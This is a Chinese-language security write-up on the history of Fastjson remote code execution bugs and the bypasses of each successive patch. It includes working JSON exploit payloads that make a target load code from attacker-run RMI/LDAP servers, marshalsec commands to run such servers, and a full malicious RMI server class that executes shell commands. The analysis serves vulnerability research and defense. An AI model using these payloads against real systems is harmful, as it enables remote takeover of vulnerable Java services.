> 原文链接: https://www.anquanke.com//post/id/182140 


# Fastjson RCE漏洞的绕过史


                                阅读量   
                                **305144**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t01a305ff8c3d77587c.png)](https://p3.ssl.qhimg.com/t01a305ff8c3d77587c.png)



Author:平安银行应用安全团队-Glassy

## 引言

最近一段时间fastjson一度成为安全圈的热门话题，作为一个是使用十分广泛的jar包，每一次的RCE漏洞都足以博得大众的眼球，关于fastjson每次漏洞的分析也已经早有大牛详细剖析，本文章旨在顺着17年fastjson第一次爆出漏洞到现在为止，看一下fastjson的缝缝补补，瞻仰一下大佬们和安全开发人员的斗智斗勇，对期间的漏洞做一个汇总，获悉其中漏洞挖掘的一些规律。



## Fastjson RCE关键函数

DefaultJSONParser. parseObject()  解析传入的json字符串提取不同的key进行后续的处理

TypeUtils. loadClass()   根据传入的类名，生成类的实例

JavaBeanDeserializer. Deserialze() 依次调用@type中传入类的对象公有set\get\is方法。

ParserConfig. checkAutoType() 阿里后续添加的防护函数，用于在loadclass前检查传入的类是否合法。



## 历史fastjson漏洞汇总与简析

### fastjson RCE漏洞的源头

首先来看一次fastjson反序列化漏洞的poc

```
`{`"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit"," "autoCommit":true`}`
```

先看调用栈

```
Exec:620, Runtime  //命令执行

…

Lookup:417, InitalContext   /jndi lookup函数通过rmi或者ldap获取恶意类

…

setAutoCommit:4067, JdbcRowSetImpl 通过setAutoCommit从而在后面触发了lookup函数

…

setValue:96, FieldDeserializer //反射调用传入类的set函数

…

deserialze:600,  JavaBeanDeserializer 通过循环调用传入类的共有set,get,is函数

…

parseObject:368, DefaultJSONParser 解析传入的json字符串

…
```

第一版的利用原理比较清晰，因为fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数，因此我们在寻找利用类的时候思路如下：
1. 类的成员变量我们可以控制
1. 想办法在调用类的某个set\get\is函数的时候造成命令执行
于是便找到了JdbcRowSetImpl类，该类在setAutoCommit函数中会对成员变量dataSourceName进行lookup，完美的jndi注入利用。

关于jndi注入的利用方式我在这里简单提一下，因为jndi注入的利用受jdk版本影响较大，所以在利用的时候还是要多尝试的。

注：利用之前当然要先确定一下漏洞是否存在，通过dnslog是个比较好用的法子。
1. 基于rmi的利用方式
适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前

利用方式：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.RMIRefServer

http://127.0.0.1:8080/test/#Expolit
```


1. 基于ldap的利用方式
适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前

利用方式：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.LDAPRefServer

http://127.0.0.1:8080/test/#Expolit
```


1. 基于BeanFactory的利用方式
适用jdk版本：JDK 11.0.1、8u191、7u201、6u211以后

利用前提：因为这个利用方式需要借助服务器本地的类，而这个类在tomcat的jar包里面，一般情况下只能在tomcat上可以利用成功。

利用方式：

```
public class EvilRMIServerNew `{`

    public static void main(String[] args) throws Exception `{`

        System.out.println("Creating evil RMI registry on port 1097");

        Registry registry = LocateRegistry.createRegistry(1097);



        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);

        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code

        ref.add(new StringRefAddr("forceString", "x=eval"));

        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows

        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app/']).start()\")"));



        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);

        registry.bind("Object", referenceWrapper);



    `}`

`}`
```

### fastjson RCE漏洞的历次修复与绕过

fastjson在曝出第一版的RCE漏洞之后，官方立马做了更新，于是就迎来了一个新的主角，checkAutoType()，在接下来的一系列绕过中都是和这个函数的斗智斗勇。

先看一下这个函数的代码

```
public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) `{`

    if (typeName == null) `{`

        return null;

    `}` else if (typeName.length() &gt;= 128) `{`

        throw new JSONException("autoType is not support. " + typeName);

    `}` else `{`

        String className = typeName.replace('$', '.');

        Class&lt;?&gt; clazz = null;

        int mask;

        String accept;

        if (this.autoTypeSupport || expectClass != null) `{`

            for(mask = 0; mask &lt; this.acceptList.length; ++mask) `{`

                accept = this.acceptList[mask];

                if (className.startsWith(accept)) `{`

                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);

                    if (clazz != null) `{`

                        return clazz;

                    `}`

                `}`

            `}`



            for(mask = 0; mask &lt; this.denyList.length; ++mask) `{`

                accept = this.denyList[mask];

                if (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) `{`

                    throw new JSONException("autoType is not support. " + typeName);

                `}`

            `}`

        `}`
```

防御的方式比较清晰，限制长度+黑名单，这个时候第一时间产生的想法自然是绕过黑名单，先看一下第一版的黑名单：

```
this.denyList = "bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework".split(",");
```

其实第一版的黑名单还是挺强大的，关于黑名单的绕过，就我已知的目前只有一个依赖于ibatis的payload，当然因为ibatis在java里面的使用还是非常广泛的，所以这个payload危害也是比较大的，这也就是1.2.45的绕过。

```
`{`"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":`{`"data_source":"rmi://localhost:1099/Exploit"`}``}`
```

绕过黑名单是第一种思路，但是安全界大牛们思路还是比较灵活的，很快又发现了第二种思路，我们再仔细看一下checkAutoType函数的下面这几行代码：

```
f (!this.autoTypeSupport) `{`

    for(mask = 0; mask &lt; this.denyList.length; ++mask) `{`

        accept = this.denyList[mask];

        if (className.startsWith(accept)) `{`

            throw new JSONException("autoType is not support. " + typeName);

        `}`

    `}`



    for(mask = 0; mask &lt; this.acceptList.length; ++mask) `{`

        accept = this.acceptList[mask];

        if (className.startsWith(accept)) `{`

            if (clazz == null) `{`

                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);

            `}`
```

该函数是先检查传入的@type的值是否是在黑名单里，然后再进入loadClass函数，这样的话如果loadClass函数里要是会对传入的class做一些处理的话，我们是不是就能绕过黑名单呢，跟进loadClass函数，

```
public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) `{`

    if (className != null &amp;&amp; className.length() != 0) `{`

        Class&lt;?&gt; clazz = (Class)mappings.get(className);

        if (clazz != null) `{`

            return clazz;

        `}` else if (className.charAt(0) == '[') `{`

            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);

            return Array.newInstance(componentType, 0).getClass();

        `}` else if (className.startsWith("L") &amp;&amp; className.endsWith(";")) `{`

            String newClassName = className.substring(1, className.length() - 1);

            return loadClass(newClassName, classLoader);
```

可以看到当传入的className以L开头以 ; 结尾的时候会把className的首字符和最后一个字符截去，再去生成实例，于是绕过的poc就非常好写了，原来的payload的利用类的首尾加上这两个字符就Ok了

```
`{`"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true`}`
```

之后的42、43版本的绕过和41的原理是一样的我们就不再提了，具体可以去[https://github.com/shengqi158/fastjson-remote-code-execute-poc/](https://github.com/shengqi158/fastjson-remote-code-execute-poc/)自行查阅。

### 最新fastjson RCE的分析

OK，现在来到了我们期待已久的最新的fastjson漏洞的分析，关于这个漏洞有很精彩的小故事可以讲一讲。

这个漏洞在曝光之后poc迟迟未见，关于它能够被利用成功的版本也可谓是每日都有更新，关于版本有几个关键字 “51”、“48”，“58”，究竟是哪个让人摸不到头脑，于是乎，决定先去看看官方的公告，发现只有49版本releases的公告里面写了“增强安全防护”，于是乎决定去48、49版本寻觅一下，看看commit之类的，但是当时也没有发现什么。

这个时候，一个名不愿透露姓名的大佬在某个技术群里面默默发了一个关键字“testcase“，当时忽然间产生了一丝电流，难道阿里的大佬们在修漏洞的时候会在testcase里面做测试，然后还把testcase的代码传到git里面了？但是还不够，因为testcase的代码太多了究竟放在哪里呢，这个时候之前的分析就可以知道，阿里在防护第一版RCE的时候是通过autotypecheck函数，那这次的补丁也很有可能和它相关喽，直接在testcase里面全局寻找带有autotype关键字的文件名，于是乎，就到达了如下位置

[![](https://p4.ssl.qhimg.com/t01ae983b1f34db5883.png)](https://p4.ssl.qhimg.com/t01ae983b1f34db5883.png)

依次去看一下里面的文件，基本都是和反序列化漏洞相关的test，其中AutoTypeTest4.java文件中有如下代码：

```
String payload="`{`\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"`}`";

 	
        String payload_2 = "`{`\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:8889/xxx\",\"autoCommit\":true`}`";

 	


 	
        assertNotNull("class deser is not null", config.getDeserializer(Class.class));

 	


 	
        int size = mappings.size();

 	


 	
        final int COUNT = 10;

 	
        for (int i = 0; i &lt; COUNT; ++i)`{`

 	
            JSON.parse(payload, config);

 	
        `}`

 	


 	
        for (int i = 0; i &lt; COUNT; ++i)`{`

 	
            Throwable error2 = null;

 	
            try `{`

 	
                JSON.parseObject(payload_2);

 	
            `}` catch (Exception e) `{`

 	
                error2 = e;

 	
            `}`

 	
            assertNotNull(error2);

 	
            assertEquals(JSONException.class, error2.getClass());

 	
        `}`

 	


 	
        assertEquals(size, mappings.size());

 	
    `}`
```

看上去和以往的payload都不太一样，先去写一个简化版的代码，调试一下

```
String payload="`{`\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"`}`";

 String payload_2 = "`{`\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true`}`";

 JSON.parse(payload);

 JSON.parse(payload_2);
```

发现可以弹框成功（从49版本往前，一个版本一个版本试验，到47版本试验成功了），那这就很可疑了，但是还有个问题，漏洞要利用总不能让你同时穿进去两个json字符串让你依次parse吧，于是把两串json整理如下

```
`{`"a":`{`"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"`}`,"b":`{`"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit","autoCommit":true`}``}``}`
```

果然可以利用成功，、接下来可以调试一下看看漏洞成因，因为一眼就能看出来是绕过了黑名单，所以问题的关键自然在checkAutoType()和loadClass()这两个函数中，去跟进一下

首先在”a”:`{`“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”`}`传入的时候，Class类是不在黑名单内的，在MiscCodec类的deserialze函数里面可以看到会将val的值拿出来用来生成对应的对象，即JdbcRowSetImpl，但是我们并没法给JdbcRowSetImpl对象的成员变量赋值，

[![](https://p2.ssl.qhimg.com/t0135713c72b4facb61.png)](https://p2.ssl.qhimg.com/t0135713c72b4facb61.png)

继续往deserialze的下面看，当传入的@type的值为Class的时候会调用loadClass函数，

[![](https://p1.ssl.qhimg.com/t019bd704eb2cac89cb.png)](https://p1.ssl.qhimg.com/t019bd704eb2cac89cb.png)

再往下跟，有调了一下loadClass函数，多加了一个值为true的参数

[![](https://p5.ssl.qhimg.com/t013376b0edf79ffe8b.png)](https://p5.ssl.qhimg.com/t013376b0edf79ffe8b.png)

再跟进去可以看到因为传入的cache为true，所以会在mapping里面把JdbcRowSetImpl这个对象的实例和com.sun.rowset.JdbcRowSetImpl对应起来，OK现在关于a的分析到此为止，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0114760407ed2eacdd.png)

我们该去跟着b

（”b”:`{`“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/Exploit”,”autoCommit”:true`}``}`）了，看看为什么checkauto()函数没把b给拦下来，直接去跟进checkautotype函数，当autotype为true的时候，虽然发现黑名单匹配了，但是TypeUtils.getClassFromMapping(typeName) ！= null所以不会抛出异常。

[![](https://p4.ssl.qhimg.com/t014a60d56f16cdf3cc.png)](https://p4.ssl.qhimg.com/t014a60d56f16cdf3cc.png)

而当autotype为false的时候，发现当传入的@type对应的类在mapping里面有的时候，就直接把之前生成的对象拉出来了，这时候直接返回，压根还没有走到后面的黑名单，所以成功绕过了之前的补丁。可以看到这次的poc是不受autotype影响的，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fbd9c231f3d37e40.png)

从上面的分析也可以明白后续官方的补丁做了什么，那自然是把cache的默认值改成了false，不让Class生成的对象存在mapping里面了。

### Fastjson漏洞挖掘的规律总结

从上面追溯的fastjson的修复绕过上面可以看到有以下几点还是很值得注意的：
1. fastjson的防范类是checkAutoType函数，而导致命令执行的很关键的一步是loadClass，因此从checkAutoType到loadClass之间的代码，将会是绕过需要研究的关键部分。
1. 如果需要绕过黑名单，需要将目光放到使用量较大，并提供jndi功能的jar包上。
1. 对于这种早就修复但是还没有公开的漏洞，github的源码中说不定有惊喜。
## 引用

https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA

[https://github.com/shengqi158/fastjson-remote-code-execute-poc/](https://github.com/shengqi158/fastjson-remote-code-execute-poc/)

https://github.com/mbechler/marshalsec
